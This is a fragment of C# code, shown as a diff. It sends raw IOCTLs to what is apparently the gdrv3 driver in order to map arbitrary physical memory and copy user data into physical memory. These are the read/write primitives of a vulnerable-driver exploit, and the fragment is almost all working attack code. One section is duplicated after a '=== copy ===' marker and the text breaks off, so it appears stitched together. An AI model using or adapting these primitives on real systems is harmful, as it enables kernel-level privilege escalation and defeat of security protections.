@@ -1,0 +1,62 @@
+l1=499 l2=519
+    }
+    // ---- W3: gdrv3 map (0xC3502004) and copy-user-to-phys (0xC3502808) ------
+    public static string GdrvMapTry(IntPtr h, ulong pa, ulong size, out ulong va, out uint err)
+    {
+        va = 0; err = 0;
+        IntPtr inb = Marshal.AllocHGlobal(0x20);
+        try
+        {
+            Marshal.WriteInt64(inb, 0, (long)pa);
+            Marshal.WriteInt64(inb, 8, (long)size);
+            Marshal.WriteInt64(inb, 16, 0);
+            Marshal.WriteInt64(inb, 24, 0);
+            uint got;
+            bool ok = DeviceIoControl(h, 0xC3502004, inb, 0x20, inb, 0x20, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            if (!ok) return string.Format("FAIL err={0} info={1}", err, got);
+            va = (ulong)Marshal.ReadInt64(inb, 0);
+            return string.Format("OK info={0} q0=0x{1:x} q1=0x{2:x}", got, va, Marshal.ReadInt64(inb, 8));
+        }
+        finally { Marshal.FreeHGlobal(inb); }
+    }
+
+    public static string GdrvCopyTry(IntPtr h, ulong a, ulong b, uint n, out uint err)
+    {
+        err = 0;
+        IntPtr inb = Marshal.AllocHGlobal(0x18);
+        try
+        {
+            Marshal.WriteInt64(inb, 0, (long)b);
+            Marshal.WriteInt64(inb, 8, (long)a);
+=== copy ===
+    }
+
+    public static string GdrvCopyTry(IntPtr h, ulong a, ulong b, uint n, out uint err)
+    {
+        err = 0;
+        IntPtr inb = Marshal.AllocHGlobal(0x18);
+        try
+        {
+            Marshal.WriteInt64(inb, 0, (long)b);
+            Marshal.WriteInt64(inb, 8, (long)a);
+            Marshal.WriteInt32(inb, 16, (int)n);
+            uint got;
+            bool ok = DeviceIoControl(h, 0xC3502808, inb, 0x18, inb, 0x18, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            return ok ? "OK" : string.Format("FAIL err={0}", err);
+        }
+        finally { Marshal.FreeHGlobal(inb); }
+    }
+
+    public static bool CloseHandle2(IntPtr h) { return CloseHandle(h); }
+
+    public static bool IsUserVa(ulong v)
+    {
+        if (v < 0x10000 || v >= 0x00007FFFFFFFFFFF) return false;
+        if ((v & 0xFFF) != 0) return false;
+        return true;
+    }
+
+    public static string ReadAt(ulong va, int n)
+    {
